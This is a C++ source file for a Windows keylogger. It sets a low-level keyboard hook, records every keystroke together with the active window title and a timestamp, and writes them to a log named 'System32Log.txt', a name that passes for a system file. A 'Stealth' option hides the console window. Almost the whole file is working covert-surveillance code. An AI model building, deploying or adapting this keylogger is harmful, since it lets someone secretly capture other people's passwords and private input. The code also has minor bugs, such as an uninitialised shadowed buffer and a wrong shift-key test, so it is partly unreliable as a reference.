#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke, char *file);

extern char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			
			// save to file
			Save(kbdStruct.vkCode, "System32Log.txt");
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke, char *file)
{
    char lastwindow[256];
    
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks
	
	
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
		
	
	HWND foreground = GetForegroundWindow();
    if (foreground)
    {
        char window_title[256];
        GetWindowText(foreground, window_title, 256);
        
        if(strcmp(window_title, lastwindow)!=0) {
            strcpy(lastwindow, window_title);
            
            // get time
            time_t t = time(NULL);
            struct tm *tm = localtime(&t);
            char s[64];
            strftime(s, sizeof(s), "%c", tm);
            
            fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
        }
    }


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 189 || key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 20)
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
			}
		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
													// check caps lock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// check shift key
			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
				lowercase = !lowercase;
			}

			if (lowercase) key_stroke += 32;
		}
		fprintf(OUTPUT_FILE, "%c", key_stroke);
    }
	// NOTE: Numpad-Keys seem to print as lowercase letters

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth()
{
	#ifdef visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
	#endif // visible

	#ifdef invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	#endif // invisible
}

int main()
{
	// visibility of window
	Stealth();

	// Set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
